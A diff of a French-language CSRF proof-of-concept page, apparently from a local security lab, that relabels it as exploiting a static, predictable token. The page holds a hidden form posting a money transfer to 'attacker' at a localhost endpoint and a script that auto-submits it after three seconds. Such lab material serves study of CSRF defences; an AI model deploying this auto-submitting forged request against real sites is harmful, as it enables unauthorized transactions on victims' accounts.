@@ -2,8 +2,8 @@
 <html>
 <head><meta charset="utf-8"><title>Attacker</title></head>
 <body>
-  <h2>CSRF PoC (Level 2)</h2>
-  <p>Ce PoC doit échouer : le token CSRF est maintenant lié à la session et imprévisible.</p>
+  <h2>CSRF PoC (Static Token)</h2>
+  <p>Ce PoC exploite un token CSRF statique et prévisible.</p>
 
   <form id="csrf" method="POST" action="http://localhost:8084/transfer.php">
     <input type="hidden" name="to" value="attacker">
@@ -12,7 +12,7 @@
   </form>
 
   <script>
-    setTimeout(() => document.getElementById("csrf").submit(),3000);
+    setTimeout(() => document.getElementById("csrf").submit(), 3000);
   </script>
 </body>
 </html>
